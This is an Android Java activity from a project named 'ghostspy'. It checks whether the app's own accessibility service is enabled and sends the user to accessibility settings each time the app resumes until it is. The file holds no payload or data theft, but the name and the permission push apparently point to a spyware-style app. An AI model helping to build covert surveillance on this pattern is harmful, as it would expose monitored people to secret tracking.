package com.spy.ghostspy;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    @Override
    protected void onResume() {
        super.onResume();
        if(!isAccessibilityPermissionGranted(getApplicationContext())) {
            requestAccessibilitySettingManager();
        }
    }

    public static boolean isAccessibilityPermissionGranted(Context context) {
        int accessibilityEnabled = 0;

        final String service = context.getPackageName() + "/" + context.getPackageName()+ ".services.MainAccessibilityService";
        Log.d("pacakgename::", context.getPackageName() + ":::" + service);
        try {
            accessibilityEnabled = Settings.Secure.getInt(
                    context.getApplicationContext().getContentResolver(),
                    android.provider.Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (Settings.SettingNotFoundException e) {
            e.printStackTrace();
        }
        TextUtils.SimpleStringSplitter mStringColonSplitter = new TextUtils.SimpleStringSplitter(':');

        if (accessibilityEnabled == 1) {
            String settingValue = Settings.Secure.getString(
                    context.getApplicationContext().getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (settingValue != null) {
                mStringColonSplitter.setString(settingValue);
                while (mStringColonSplitter.hasNext()) {
                    String accessibilityService = mStringColonSplitter.next();
                    Log.d("accessibilityService::", accessibilityService);
                    if (accessibilityService.equalsIgnoreCase(service)) {
                        Log.d("permission11::", "Accessibility is enabled");
                        return true;
                    }
                }
            }
        }
        return false;
    }

    private void requestAccessibilitySettingManager() {
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        startActivity(intent);
    }
}